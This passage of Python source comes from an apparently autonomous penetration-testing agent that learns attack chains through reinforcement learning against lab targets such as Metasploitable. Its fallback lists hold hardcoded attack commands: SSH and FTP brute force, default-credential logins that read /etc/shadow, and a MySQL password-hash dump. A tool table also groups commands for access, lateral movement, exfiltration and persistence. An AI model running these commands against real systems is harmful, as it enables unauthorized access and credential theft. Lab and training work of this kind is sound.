            "exact_repeats": exact_repeat_count,
            "prefix_repeats": prefix_repeat_count,
            "family": family,
            "family_count": family_count,
            "ppo_bypass": ppo_bypass,
            "mentor_engaged": should_call_gpt,
            "mentor_tier": mentor_engagement.tier.value if mentor_engagement else None,
            "cognition_brain": (
                self._cognition_result.winning_brain
                if self._cognition_result else None
            ),
        }

        # Record decision
        self.decisions.append(result)
        
        # =====================================================================
        # P1: DecisionCore tracking now happens inside _p1_arbitrate_decision
        # via DecisionCore.arbitrate() → _record_hit(). No passive tracking
        # needed here. HarmonyMetrics records final attribution below.
        # =====================================================================

        # Get arbitration scores from DecisionCore's last result
        _arb_weights: Optional[Dict[str, float]] = None
        if self._decision_core is not None:
            try:
                _last_arb = getattr(self._decision_core, "last_result", None)
                if _last_arb is not None:
                    _arb_weights = {
                        k: round(v, 4)
                        for k, v in getattr(
                            _last_arb, "all_scores", {}
                        ).items()
                    }
            except Exception:
                pass

        if self._harmony_metrics is not None:
            try:
                self._harmony_metrics.record_decision(
                    source=result.source or "unknown",
                    arbitration_weights=_arb_weights,
                )
                # Track DDQN macro switches
                if self._active_macro is not None:
                    _macro_name = (
                        self._active_macro.name
                        if hasattr(self._active_macro, 'name')
                        else str(self._active_macro)
                    )
                    self._harmony_metrics.record_macro_step(_macro_name)
            except Exception as e:
                logger.debug(f"[HARMONY] Metrics recording failed: {e}")

        # Phase 9: Record reasoning trace to CognitiveBus
        try:
            bus = self._get_cognitive_bus()
            if bus is not None:
                from core.memory.unified_cognitive_bus import ReasoningTrace
                bus.record_reasoning(ReasoningTrace(
                    agent_id=self.agent_name,
                    step=step_ctx.step,
                    command=result.command or "",
                    why=result.reasoning or f"Pipeline source: {result.source}",
                    when_context=f"Phase={current_phase.name}, step={step_ctx.step}",
                    how_execution=result.source,
                    expected_outcome=f"conf={confidence:.2f}",
                    reasoning_source=result.source,
                ))
        except Exception:
            pass

        # Log mentor call if applicable
        if result.mentor_call and self.mentor_log_path:
            self._log_mentor_call(step_ctx, proposed_action, result)

        # Phase 40: Attach decision trace to result for dashboard visualization
        if hasattr(self, '_decision_trace') and self._decision_trace:
            result.decision_trace = list(self._decision_trace)
        elif not result.decision_trace:
            # Minimal trace from source field
            result.decision_trace = [
                {"stage": result.source or "unknown", "result": "selected",
                 "score": result.confidence, "passed": True}
            ]
        
        return result
    
    # ─── ACTION FAMILY CLASSIFICATION ────────────────────────────────────
    ACTION_FAMILIES = {
        "recon": {"nmap", "masscan", "ping", "traceroute", "netdiscover", "arp-scan",
                  "unicornscan", "nbtscan", "fierce", "dnsrecon", "dig", "host",
                  "nslookup", "whois"},
        "enum": {"gobuster", "dirb", "dirsearch", "feroxbuster", "ffuf", "wfuzz",
                 "nikto", "whatweb", "enum4linux", "smbclient", "rpcclient",
                 "showmount", "rpcinfo", "finger", "smtp-user-enum", "snmpwalk",
                 "ldapsearch", "onesixtyone"},
        "access": {"hydra", "medusa", "ncrack", "patator", "crackmapexec",
                   "ssh", "telnet", "ftp", "mysql", "psql", "nc", "msfconsole",
                   "searchsploit", "sqlmap", "commix", "curl", "wget"},
        "web": {"xsstrike", "dalfox", "tplmap", "wpscan", "droopescan",
                "arjun", "paramspider", "linkfinder", "gospider", "hakrawler",
                "katana", "nuclei"},
        "lateral": {"smbclient", "psexec", "wmiexec", "evil-winrm", "impacket",
                    "chisel", "ligolo", "socat", "proxychains"},
        "exfil": {"scp", "rsync", "base64", "xxd", "tar", "zip"},
        "persist": {"crontab", "systemctl", "chmod", "chown", "useradd",
                    "passwd", "ssh-keygen"},
        "defense": {"ss", "ps", "last", "journalctl", "netstat", "lsof",
                    "iptables", "ufw", "fail2ban-client", "chkrootkit",
                    "rkhunter", "lynis", "osquery"},
    }
    
    @staticmethod
    def _extract_tool_prefix(cmd: str) -> str:
        """Extract the actual tool name from a command, handling piped compound commands.
        
        For regular commands like 'nmap -sV target', returns 'nmap'.
        For piped ingreslock commands like '{ echo ...; } | timeout 10 telnet target 1524',
        returns 'telnet' (the actual tool after the pipe).
        """
        cmd = cmd.strip()
        if not cmd:
            return ""
        # Handle { echo ...; } | timeout N tool target port
        if cmd.startswith("{"):
            pipe_idx = cmd.find("|")
            if pipe_idx >= 0:
                after_pipe = cmd[pipe_idx + 1:].strip()
                parts = after_pipe.split()
                # Skip 'timeout N' if present
                if len(parts) >= 3 and parts[0] == "timeout":
                    return parts[2].lower()
                elif parts:
                    return parts[0].lower()
        return cmd.split()[0].lower()

    def _get_action_family(self, cmd_prefix: str) -> str:
        """Classify a command prefix into an action family."""
        for family, tools in self.ACTION_FAMILIES.items():
            if cmd_prefix in tools:
                return family
        return "other"
    
    def _store_ppo_negative_reward(self, penalty: float, reason: str) -> None:
        """
        Phase 7.2: Store a negative reward for the pending PPO trajectory.
        
        When a PPO-selected command gets replaced (e.g., backward phase, wrong
        command), we inject a negative reward so PPO learns not to propose it again.
        This fixes the 'silent disconnect' where PPO never gets feedback on bad choices.
        """
        if self._ppo_pending is None:
            return
        
        try:
            if self.ppo_agent is not None:
                self.ppo_agent.store_transition(
                    state=self._ppo_pending["state"],
                    action=self._ppo_pending["action"],
                    log_prob=self._ppo_pending["log_prob"],
                    reward=penalty,
                    value=self._ppo_pending["value"],
                    done=False,
                )
                self._ppo_pending = None
                logger.debug(
                    f"[PPO-NEG] {self.agent_name}: Stored penalty {penalty:.1f} "
                    f"for {reason}"
                )
        except Exception as e:
            logger.debug(f"[PPO-NEG] Failed to store penalty: {e}")
    
    # ─── Phase 8.0: Cross-episode attack chain memory ────────────────────────
    
    def _record_chain_step(self, command: str, reward: float) -> None:
        """Record a command + reward in the current episode's attack chain."""
        self._episode_chain.append(command)
        self._episode_chain_rewards.append(reward)
        # Decay exploration score on repeat, boost on new command
        if command in self._episode_chain[:-1]:
            self._exploration_score = max(0.1, self._exploration_score * 0.85)
        else:
            self._exploration_score = min(2.0, self._exploration_score * 1.1)
        
        # Phase 8.1: Hypothesis-test-learn cycle
        # Track which commands succeed/fail to build reasoning patterns
        if reward > 5.0:
            _success_note = f"✓ {command.split()[0]} worked (r={reward:.0f})"
            if _success_note not in self._reasoning_hypotheses:
                self._reasoning_hypotheses.append(_success_note)
                if len(self._reasoning_hypotheses) > 8:
                    self._reasoning_hypotheses = self._reasoning_hypotheses[-8:]
        elif reward < -2.0:
            _fail_note = f"✗ {command.split()[0]} failed"
            if _fail_note not in self._reasoning_failures:
                self._reasoning_failures.append(_fail_note)
                if len(self._reasoning_failures) > 6:
                    self._reasoning_failures = self._reasoning_failures[-6:]
    
    def _save_episode_chain(self, total_reward: float, highest_phase: str) -> None:
        """Save the current episode's chain to cross-episode memory if valuable."""
        if not self._episode_chain:
            return
        chain = {
            "commands": self._episode_chain.copy(),
            "rewards": self._episode_chain_rewards.copy(),
            "total_reward": total_reward,
            "highest_phase": highest_phase,
            "unique_commands": len(set(self._episode_chain)),
            "agent": self.agent_name,
        }
        self._successful_chains.append(chain)
        # Keep top N by total_reward
        self._successful_chains.sort(key=lambda c: c["total_reward"], reverse=True)
        self._successful_chains = self._successful_chains[:self._chain_memory_size]
        # Update best chain
        if self._best_chain is None or total_reward > self._best_chain["total_reward"]:
            self._best_chain = chain
            logger.debug(
                f"[CHAIN-MEM] {self.agent_name}: New best chain! "
                f"reward={total_reward:.1f}, cmds={len(chain['commands'])}, "
                f"unique={chain['unique_commands']}, phase={highest_phase}"
            )
    
    def _get_chain_suggestion(self, step: int, current_phase: str) -> Optional[str]:
        """Get a command suggestion from the best attack chain for this phase/step.
        
        Phase 8.1: Enhanced with exploit path micro-curriculum.
        Returns command string if a relevant chain step exists, None otherwise.
        Used as a soft hint for the PPO/playbook decision.
        """
        if not self._best_chain:
            return None
        best_cmds = self._best_chain["commands"]
        if step < len(best_cmds):
            # Phase 8.1: Only suggest if the chain command matches current phase context
            # This prevents suggesting exploit commands during recon
            suggestion = best_cmds[step]
            return suggestion
        # Phase 8.1: If beyond the chain length but chain was successful,
        # suggest repeating the last high-reward command pattern
        if self._best_chain.get("total_reward", 0) > 2000 and best_cmds:
            # Find the highest-reward command in the chain
            chain_rewards = self._best_chain.get("rewards", [])
            if chain_rewards:
                best_idx = max(range(len(chain_rewards)), key=lambda i: chain_rewards[i])
                return best_cmds[best_idx]
        return None
    
    def _reset_episode_chain(self) -> None:
        """Reset current episode chain tracking."""
        self._episode_chain = []
        self._episode_chain_rewards = []
        self._exploration_score = 1.0
        self._reasoning_hypotheses = []
        self._reasoning_failures = []
        self._reasoning_plan = None
    
    def _build_reasoning_context(self, ctx: "AttackContext", step: int,
                                   discovery_board: Optional[Dict[str, Any]] = None) -> str:
        """Build a rich reasoning context string for mentor/LLM calls.
        
        Phase 8.0: Includes attack chain history, failures, hypotheses,
        and cross-episode best chain info for better strategic reasoning.
        Phase 38: Uses discovery_board (ground truth) for ports/services.
        """
        parts = []
        parts.append(f"Step {step} | Phase: {ctx.current_phase.name}")
        parts.append(f"Target: {ctx.target}")
        
        # Phase 38: Prefer discovery_board (ground truth) over ctx.discoveries
        if discovery_board:
            _ports = list(discovery_board.get("ports", []))[:10]
            _services = list(discovery_board.get("services", []))[:5]
        else:
            _ports = ctx.discoveries.get("ports", []) if isinstance(ctx.discoveries, dict) else []
            _services = ctx.services_found if hasattr(ctx, "services_found") else []
        parts.append(f"Ports: {len(_ports)} | Services: {len(_services)}")
        parts.append(f"Creds: {'YES' if ctx.state_flags.get('credentials_known') else 'NO'}")
        parts.append(f"Shell: {'YES' if ctx.state_flags.get('shell_obtained') else 'NO'}")
        parts.append(f"Root: {'YES' if ctx.state_flags.get('root_shell_obtained') else 'NO'}")
        
        # Recent commands (last 5)
        if ctx.command_history:
            parts.append(f"Recent: {', '.join(ctx.command_history[-5:])}")
        
        # Failures (what we learned)
        if self._reasoning_failures:
            parts.append(f"Failed: {'; '.join(self._reasoning_failures[-3:])}")
        
        # Current hypotheses
        if self._reasoning_hypotheses:
            parts.append(f"Hypotheses: {'; '.join(self._reasoning_hypotheses[-2:])}")
        
        # Best chain hint
        if self._best_chain:
            chain_hint = self._best_chain["commands"][:5]
            parts.append(f"Best chain (prev episode): {' -> '.join(chain_hint)}")
        
        # Exploration score
        parts.append(f"Exploration: {self._exploration_score:.2f}")
        
        # Phase 8.1: Kill chain progress tracking
        if self._episode_chain:
            _unique = len(set(self._episode_chain))
            _total = len(self._episode_chain)
            parts.append(f"Chain: {_unique}/{_total} unique cmds")
        
        return " | ".join(parts)
    
    # ── R48: Dynamic phase-aware alternative selection ────────────────────
    def _get_dynamic_alternative(
        self,
        ctx: Any,
        used_cmds: set,
        used_prefixes: set,
    ) -> Optional[str]:
        """Get a phase-aware, role-filtered, macro-aware alternative from the registry.

        Returns a rendered command string, or None if no suitable command found.
        Uses the same filtering pipeline as _decide_registry / _force_novel_command
        but in a lightweight path suitable for anti-repeat fallback.

        P50: Gap-aware scoring — prioritizes commands that address known gaps
        in the discovery board (e.g., no creds → cred discovery, no shell → 
        access commands) instead of random top-5 selection.
        """
        import random
        try:
            # 1. Get phase-valid, precondition-met commands
            state_flags: Dict[str, Any] = ctx.state_flags if hasattr(ctx, 'state_flags') else {}
            current_phase = ctx.current_phase if hasattr(ctx, 'current_phase') else None
            
            valid_commands = get_valid_commands_for_state(state_flags, current_phase)
            if not valid_commands:
                valid_commands = get_valid_commands_for_state(state_flags)
            if not valid_commands:
                return None
            
            # 2. Role filter
            role_filtered = self._filter_commands_for_role(valid_commands)
            if not role_filtered:
                return None
            
            # 3. Tool availability filter
            role_filtered = [cmd for cmd in role_filtered if self._is_tool_available(cmd)]
            if not role_filtered:
                return None
            
            # 4. DDQN macro filter — if a macro is active, prefer its commands
            macro_filtered = role_filtered
            if self._active_macro is not None:
                try:
                    from core.algorithms.ddqn_macro import MACRO_COMMAND_MAP
                    macro_allowed = MACRO_COMMAND_MAP.get(self._active_macro, set())
                    if macro_allowed:
                        _mf = [cmd for cmd in role_filtered if cmd.name in macro_allowed]
                        if len(_mf) >= 2:
                            macro_filtered = _mf
                except Exception:
                    pass
            
            # 5. Render and filter out already-used commands
            candidates = []
            params = {"target": ctx.target}
            for template in macro_filtered:
                for param in template.required_params:
                    if param not in params:
                        params[param] = self._get_default_param(param, ctx)
                rendered = render_command(template, params)
                # Skip exact matches with history
                if rendered.strip() in used_cmds:
                    continue
                # Skip commands with heavily-used prefixes
                prefix = self._extract_tool_prefix(rendered)
                prefix_uses = sum(1 for p in used_prefixes if p == prefix)
                if prefix_uses >= 3:
                    continue
                candidates.append((rendered, template.typical_reward, template.tags))
            
            if not candidates:
                return None
            
            # ── P50: Gap-aware scoring ──────────────────────────────
            # Instead of random top-5, score candidates by how well they
            # address the current gap in discoveries.
            _has_creds = state_flags.get("credentials_known", False)
            _has_shell = state_flags.get("shell_obtained", False)
            _has_root = state_flags.get("root_shell_obtained", False)
            _has_vuln = state_flags.get("vuln_discovered", False)
            _has_services = state_flags.get("services_discovered", False)

            def _gap_score(cmd_str: str, reward: float, tags: set) -> float:
                """Score a candidate by how well it addresses discovery gaps."""
                score = reward  # Base: typical_reward
                cmd_lower = cmd_str.lower()

                # Boost web discovery if no creds/shell (common CTF path)
                if not _has_creds and not _has_shell:
                    if any(k in cmd_lower for k in ("curl", "wget", "gobuster", "ffuf",
                                                      "nikto", "dirb", "feroxbuster")):
                        score += 5.0
                    if any(k in cmd_lower for k in ("/data", "/download", "/api",
                                                      "/admin", "/backup", "/files")):
                        score += 8.0

                # Boost credential discovery if no creds
                if not _has_creds:
                    if "cred" in str(tags) or "brute" in str(tags):
                        score += 6.0
                    if any(k in cmd_lower for k in ("hydra", "medusa", "crackmapexec",
                                                      "enum4linux", "smbclient")):
                        score += 4.0

                # Boost access commands if creds but no shell
                if _has_creds and not _has_shell:
                    if any(k in cmd_lower for k in ("sshpass", "ssh ", "ftp ",
                                                      "winrm", "psexec", "evil-winrm")):
                        score += 10.0

                # Boost privesc if shell but no root
                if _has_shell and not _has_root:
                    if any(k in cmd_lower for k in ("sudo", "linpeas", "linenum",
                                                      "getcap", "suid", "privesc")):
                        score += 8.0

                # Boost PCAP/traffic analysis for web-focused CTFs
                if not _has_creds and _has_services:
                    if any(k in cmd_lower for k in ("tshark", "tcpdump", "strings",
                                                      "pcap", ".cap")):
                        score += 6.0

                return score

            scored = [(cmd, _gap_score(cmd, rwd, tags)) for cmd, rwd, tags in candidates]
            scored.sort(key=lambda x: x[1], reverse=True)

            # Pick from top 3 (tighter than old top-5 → more strategic)
            top_n = min(3, len(scored))
            chosen = random.choice(scored[:top_n])
            return chosen[0]
            
        except Exception as e:
            logger.debug(f"[{self.agent_name}] Dynamic alternative failed: {e}")
            return None
    
    def _replace_with_alternative(
        self,
        result: SmartDecisionResult,
        step_ctx: SmartStepContext,
        ctx: Any,
        all_cmds: List[str],
        reason: str,
    ) -> SmartDecisionResult:
        """Replace a blocked command with a phase-aware, macro-aware alternative.

        R48: First tries to get a registry command matching the current phase,
        role, and DDQN macro-intent.  Falls back to static per-role pool only
        if the dynamic query yields nothing.
        """
        import random

        # R60: Track anti-repeat hits for codex meta spike trigger
        self._codex_meta_antirepeat_hits = getattr(self, '_codex_meta_antirepeat_hits', 0) + 1
        
        logger.debug(
            f"[{self.agent_name}] ANTI-REPEAT: Replacing '{result.command[:40]}...' ({reason})"
        )
        
        role_name = self.agent_role.get("role", "generic")
        step = step_ctx.step
        target = ctx.target
        rand_offset = random.randint(0, 1000)
        
        # ── R48: Phase-aware dynamic alternative from registry ────────────
        used_cmds_set = set(c.strip() for c in all_cmds if c.strip())
        used_prefixes = set(self._extract_tool_prefix(c) for c in all_cmds if c.strip())
        _dynamic_cmd = self._get_dynamic_alternative(ctx, used_cmds_set, used_prefixes)
        if _dynamic_cmd is not None:
            result.command = _dynamic_cmd
            result.mentor_reasoning = (
                f"[ANTI-REPEAT:{reason}→registry] "
                f"{result.mentor_reasoning or 'Phase-aware alternative'}"
            )
            result.confidence = 0.5  # Higher than static (0.3) — strategically coherent
            result.source = "anti_repeat"
            result._repeat_penalty = -5.0
            
            # Graduated PPO negative reward (same as static path)
            _repeat_penalty = -3.0
            if reason == "prefix_flood":
                _repeat_penalty = -8.0
            elif "exact_repeat" in reason:
                _repeat_count = sum(1 for c in all_cmds if c == result.command)
                _repeat_penalty = -3.0 - min(5.0, _repeat_count * 1.5)
            
            if self._ppo_pending is not None:
                self._ppo_trajectory.append({
                    "state": self._ppo_pending["state"],
                    "action": self._ppo_pending["action"],
                    "log_prob": self._ppo_pending["log_prob"],
                    "value": self._ppo_pending["value"],
                    "reward": _repeat_penalty,
                    "done": False,
                    "teacher_distribution": self._ppo_pending.get("teacher_distribution"),
                    "teacher_action": self._ppo_pending.get("teacher_action"),
                })
                self._ppo_pending = None
            
            logger.debug(
                f"[{self.agent_name}] ANTI-REPEAT→REGISTRY: "
                f"'{_dynamic_cmd[:50]}' (phase-aware)"
            )
            return result
        # ── End R48 dynamic alternative ───────────────────────────────────
        
        # ── R48 static fallback: target-aware alternatives ────────────
        # Check if this is an MS2 target (172.28.0.10) or HTB/generic
        _is_ms2 = target in ("172.28.0.10", "192.168.56.101", "192.168.56.102")
        _is_ms3 = target in ("172.28.0.11", "192.168.56.103")
        _is_msf = _is_ms2 or _is_ms3
        
        # Discovered creds from attack context (for HTB targets)
        _disc_user = ""
        _disc_pass = ""
        if hasattr(ctx, 'discoveries'):
            _creds = ctx.discoveries.get("credentials", [])
            if isinstance(_creds, list):
                for _c in _creds:
                    if isinstance(_c, str) and ":" in _c:
                        _p = _c.split(":", 1)
                        _disc_user = _p[0]
                        _disc_pass = _p[1]
                        break
        
        alternative_commands = {
            "recon": [
                f"nmap -sV -p 21,22,80,443 {target}",
                f"nmap -sC -p 21,22,80,443 {target}",
                f"nmap --script vuln -p 21,22,80 {target}",
                f"nmap -sV --version-intensity 5 -p 21,22,80 {target}",
                f"gobuster dir -u http://{target} -w /usr/share/dirb/wordlists/common.txt -x php,html,txt -t 50 --no-error -b 302,404",
                f"ffuf -u http://{target}/FUZZ -w /usr/share/dirb/wordlists/common.txt -mc 200,301 -t 50",
                f"curl -s http://{target}/ | head -100",
                f"whatweb http://{target}",
                f"dig @{target} ANY",
                f"showmount -e {target}",
            ],
            "offensive": ([
                # Generic/HTB alternatives — use discovered creds if available
                f"curl -s http://{target}/",
                f"curl -s http://{target}/data/ 2>/dev/null || curl -s http://{target}/download/ 2>/dev/null",
                f"curl -s http://{target}/robots.txt",
                f"nikto -h http://{target} -maxtime 30s",
                f"searchsploit gunicorn",
                f"searchsploit vsftpd 3.0",
                f"searchsploit openssh 8.2",
                f"hydra -l admin -P /usr/share/nmap/nselib/data/passwords.lst ssh://{target} -t 4",
                f"hydra -l root -P /usr/share/nmap/nselib/data/passwords.lst ftp://{target} -t 4",
                # P50: Web app path enumeration (Cap-style CTFs with /data/N endpoints)
                f"curl -sI http://{target}/",
                f"curl -s http://{target}/ | head -100",
                f"curl -s http://{target}/data/0",
                f"curl -s http://{target}/data/1",
                f"curl -s http://{target}/data/2",
                f"curl -s http://{target}/api/ 2>/dev/null || curl -s http://{target}/admin/ 2>/dev/null",
                f"curl -s http://{target}/ | grep -oP 'href=\"[^\"]+\"' | head -20",
                f"curl -s http://{target}/ | grep -oP 'src=\"[^\"]+\"' | head -20",
                f"curl -s http://{target}/data/ 2>/dev/null",
                f"curl -s http://{target}/download/ 2>/dev/null || curl -s http://{target}/capture/ 2>/dev/null",
                # P50: PCAP/traffic analysis (critical for Cap)
                f"find /tmp -name '*.pcap' -o -name '*.cap' 2>/dev/null | head -5",
                f"ls -la /tmp/*.pcap /tmp/*.cap 2>/dev/null",
                # P50: FTP anonymous access check (sh-compatible, no bash <<<)
                f"echo -e 'user anonymous\\npass anonymous@\\nls -la\\nbye' | ftp -n {target} 2>/dev/null",
                f"nmap -sV -p21 --script ftp-anon,ftp-syst {target}",
            ] + ([
                # If discovered creds — SSH into target
                f"sshpass -p '{_disc_pass}' ssh -o StrictHostKeyChecking=no {_disc_user}@{target} 'id; whoami; uname -a'",
                f"sshpass -p '{_disc_pass}' ssh -o StrictHostKeyChecking=no {_disc_user}@{target} 'sudo -l 2>/dev/null; cat /etc/passwd | head -20'",
            ] if _disc_user and _disc_pass else [])
            + ([
                # MS2-specific exploitation commands
                f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'echo msfadmin | sudo -S cat /etc/shadow'",
                f"mysql -h {target} -u root -psploitme -e 'SELECT user,password FROM mysql.user' 2>/dev/null",
                f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} 'echo msfadmin | sudo -S id'",
                f"hydra -l msfadmin -p msfadmin ftp://{target} -t 4",
                f"searchsploit proftpd 1.3.5",
                f"searchsploit samba 3.0",
                f"enum4linux -a {target}",
                f"rpcclient -U '' -N {target} -c 'enumdomusers'",
                f"smbclient //{target}/tmp -N -c 'ls'",
            ] if _is_msf else [])),
            "stealth": [
                f"nc -zv {target} 21 2>&1",
                f"nc -zv {target} 22 2>&1",
                f"nc -zv {target} 80 2>&1",
                f"nc -zv {target} 443 2>&1",
                f"curl -s -o /dev/null -w '%{{http_code}}' http://{target}/",
                f"curl -s http://{target}/robots.txt 2>/dev/null",
                f"whatweb -q http://{target}",
            ] + ([
                f"nc -zv {target} 139 2>&1",
                f"nc -zv {target} 445 2>&1",
                f"nc -zv {target} 3306 2>&1",
                f"smbclient -L //{target} -N 2>/dev/null",
                f"enum4linux -a {target} 2>/dev/null",
            ] if _is_msf else []),
            "strategic": [
                f"nmap -sV -O -p 21,22,80 {target}",
                f"nmap --script vuln -p 21,22,80 {target}",
                f"nmap -sC -p 21,22,80 {target}",
                f"curl -s http://{target}/ | head -50",
                f"gobuster dir -u http://{target} -w /usr/share/dirb/wordlists/common.txt -x php,html,txt -t 50 --no-error -b 302,404",
            ] + ([
                f"nmap --script smb-enum-shares -p 139,445 {target}",
                f"nmap --script mysql-info -p 3306 {target}",
                f"nmap -sC -p 1099,1524,2049,5432,8180 {target}",
                f"searchsploit vsftpd 2.3.4",
                f"searchsploit samba 3.0",
                f"searchsploit unrealircd",
            ] if _is_msf else []),
            "defensive": [
                f"ss -tlnp 2>/dev/null",
                f"ps aux --sort=-%cpu 2>/dev/null",
                f"last -n {5 + step*2}",
                f"netstat -tulpn 2>/dev/null",
                f"lsof -i -P -n 2>/dev/null",
                f"iptables -L -n -v 2>/dev/null",
            ],
        }
        
        alts = alternative_commands.get(role_name, alternative_commands["recon"])
        # Phase 7.5: Filter alternatives for tool availability
        _ut = getattr(self, '_unavailable_tools', set())
        if _ut:
            alts = [cmd for cmd in alts
                    if cmd.strip().split()[0].lower() not in _ut]
        # R47 Fix #4: Skip sshpass alternatives when SSH is consistently failing
        _ssh_fails = getattr(self, '_ssh_failures_this_episode', 0)
        if _ssh_fails >= 2:
            alts = [cmd for cmd in alts if not cmd.strip().startswith("sshpass ")]
            if not alts:
                # Fallback: if ALL alternatives were sshpass, restore non-sshpass from role
                alts = alternative_commands.get(role_name, alternative_commands["recon"])
                alts = [cmd for cmd in alts if not cmd.strip().startswith("sshpass ")]
            if not alts:
                alts = alternative_commands["recon"]  # Ultimate fallback
        used_prefixes = set(self._extract_tool_prefix(c) for c in all_cmds if c.strip())
        available = [cmd for cmd in alts if self._extract_tool_prefix(cmd) not in used_prefixes]
        if not available:
            available = alts.copy()
            random.shuffle(available)
        new_cmd = random.choice(available) if available else alts[step % len(alts)]
        
        # R51: Prepend SSH cleanup to any sshpass alternative to prevent
        # "Connection closed" from MaxSessions exhaustion
        if new_cmd.strip().startswith("sshpass "):
            new_cmd = f"pkill -f 'ssh.*{target}' 2>/dev/null; sleep 0.3; {new_cmd}"
        
        result.command = new_cmd
        result.mentor_reasoning = f"[ANTI-REPEAT:{reason}] {result.mentor_reasoning or 'Forced alternative'}"
        result.confidence = 0.3
        result.source = "anti_repeat"
        result._repeat_penalty = -5.0
        
        # Phase 8.1 B7: Graduated negative reward for PPO learning
        # Worse penalty for repeat of already-failed commands
        _repeat_penalty = -3.0  # Base penalty
        if reason == "prefix_flood":
            _repeat_penalty = -8.0  # Severe: flooding same tool
        elif reason == "exact_repeat":
            _repeat_count = sum(1 for c in all_cmds if c == result.command)
            _repeat_penalty = -3.0 - min(5.0, _repeat_count * 1.5)  # Up to -10.5
        
        # Store PPO trajectory with graduated negative reward
        if self._ppo_pending is not None:
            self._ppo_trajectory.append({
                "state": self._ppo_pending["state"],
                "action": self._ppo_pending["action"],
                "log_prob": self._ppo_pending["log_prob"],
                "value": self._ppo_pending["value"],
                "reward": _repeat_penalty,
                "done": False,
                "teacher_distribution": self._ppo_pending.get("teacher_distribution"),
                "teacher_action": self._ppo_pending.get("teacher_action"),
            })
            self._ppo_pending = None
        
        return result
    
    def _filter_commands_for_role(self, commands: List[CommandTemplate]) -> List[CommandTemplate]:
        """
        Filter commands based on agent's role with EXCLUSIVE domain enforcement.
        
        Each agent has:
        - preferred_commands: Commands they should prioritize
        - command_tags: Tags they should look for
        - avoid_tags: Tags they should NOT use
        - exclusive_prefixes: Prefixes ONLY this agent can use (others cannot)
        """
        role = self.agent_role
        preferred_names = set(role.get("preferred_commands", []))
        wanted_tags = role.get("command_tags", set())
        avoid_tags = role.get("avoid_tags", set())
        primary_phases = role.get("primary_phases", [])
        my_exclusive = role.get("exclusive_prefixes", [])
        
        # Collect ALL exclusive prefixes from OTHER agents
        other_exclusive_prefixes = []
        for other_agent, other_role in self.AGENT_ROLES.items():
            if other_agent != self.agent_name:
                other_exclusive_prefixes.extend(other_role.get("exclusive_prefixes", []))
        
        filtered = []
        for cmd in commands:
            cmd_lower = cmd.name.lower()
            template_lower = cmd.template.lower() if hasattr(cmd, 'template') else ""
            
            # STRICT EXCLUSIVITY: Skip commands that belong to OTHER agents' exclusive domains
            # Check BOTH the command name AND the template
            belongs_to_other = False
            for prefix in other_exclusive_prefixes:
                prefix_lower = prefix.lower().strip()
                if cmd_lower.startswith(prefix_lower) or template_lower.startswith(prefix_lower):
                    belongs_to_other = True
                    break
            
            if belongs_to_other:
                continue  # This command belongs to another agent
            
            # Skip commands with avoided tags
            if cmd.tags & avoid_tags:
                continue
            
            # R42: Phase-gate — block commands from phases this agent doesn't operate in
            # Prevents post-exploit commands leaking to recon/strategic agents even
            # when their tags don't exactly match avoid_tags
            if primary_phases and cmd.phase not in primary_phases:
                # Allow preferred commands regardless of phase (explicit override)
                if cmd.name not in preferred_names:
                    continue
            
            # Skip commands already used this step (deduplication)
            if cmd.name in self.step_used_commands:
                continue
            
            # Phase 7.4: Skip commands for tools not installed on this system
            if not self._is_tool_available(cmd):
                continue
            
            # Prioritize preferred commands
            if cmd.name in preferred_names:
                filtered.insert(0, cmd)  # Add to front
            # Prioritize our exclusive commands
            elif any(cmd_lower.startswith(p.lower().strip()) for p in my_exclusive):
                filtered.insert(0, cmd)  # Our exclusive domain - high priority
            # Or commands with matching tags
            elif cmd.tags & wanted_tags:
                filtered.append(cmd)
            # Or commands in agent's primary phases
            elif cmd.phase in primary_phases:
                filtered.append(cmd)
            # Include some others for variety (with lower priority)
            elif not avoid_tags or not (cmd.tags & avoid_tags):
                filtered.append(cmd)
        
        return filtered
    
    # ── Phase 7.4: Tool availability filter ──────────────────────────────
    
    # Tools known to NOT be standard Linux utilities and likely missing.
    # We check these with shutil.which() once at init.
    # Phase 8.2 Batch 9: Added impacket-atexec, impacket-wmiexec, impacket-GetNPUsers,
    # impacket-GetUserSPNs, evil-winrm, redis-cli, linpeas, mysqldump, certipy
    # Phase 8.2 Batch 10: Added last, knock, dnsenum, wfuzz, ldapsearch, mysql (client)
    _TOOL_BINARIES = {
        "crackmapexec", "impacket-psexec", "impacket-secretsdump",
        "impacket-smbexec", "impacket-atexec", "impacket-wmiexec",
        "impacket-GetNPUsers", "impacket-GetUserSPNs",
        "smbmap", "dirsearch", "dnsrecon", "dnsenum",
        "wpscan", "commix", "chisel", "windapsearch", "enum4linux-ng",
        "rpcinfo", "gospider", "feroxbuster", "gobuster",
        "masscan", "whatweb", "smbclient", "rpcclient",
        "nuclei", "ffuf", "nikto", "sqlmap", "hydra",
        "nmap", "msfconsole", "msfvenom", "searchsploit",
        "enum4linux", "ftp", "telnet", "sshpass", "psql", "mysql",
        "curl", "nc", "dig", "wfuzz", "ldapsearch",
        "evil-winrm", "redis-cli", "linpeas", "mysqldump", "certipy",
        "last", "knock",
    }
    
    def _get_cognitive_bus(self):
        """Lazy-load the CognitiveBus singleton (Phase 9)."""
        if self._cognitive_bus is None:
            try:
                from core.memory.unified_cognitive_bus import get_cognitive_bus
                self._cognitive_bus = get_cognitive_bus()
            except Exception:
                pass
        return self._cognitive_bus

    def _get_hybrid_memory(self):
        """Lazy-load the HybridMemory singleton (Phase 9.1)."""
        if self._hybrid_memory is None:
            try:
                from core.memory.hybrid_memory import get_hybrid_memory
                self._hybrid_memory = get_hybrid_memory()
            except Exception:
                pass
        return self._hybrid_memory

    def _check_tool_availability(self) -> None:
        """One-time check: which tool binaries are installed on this system."""
        import shutil
        unavailable = set()
        for tool in self._TOOL_BINARIES:
            if not shutil.which(tool):
                unavailable.add(tool)
        self._unavailable_tools = unavailable
        if unavailable and self.agent_name == "RedAgent":
            # Only log once (from Red's perspective) to avoid 5× spam
            logger.info(
                f"[TOOL-CHECK] {len(unavailable)} unavailable tools filtered: "
                f"{', '.join(sorted(unavailable)[:10])}{'...' if len(unavailable) > 10 else ''}"
            )
    
    def _is_tool_available(self, cmd: "CommandTemplate") -> bool:
        """Check if the base tool for a command is installed."""
        if not self._unavailable_tools:
            return True
        # Extract the first word (tool binary) from the template
        template = cmd.template.strip()
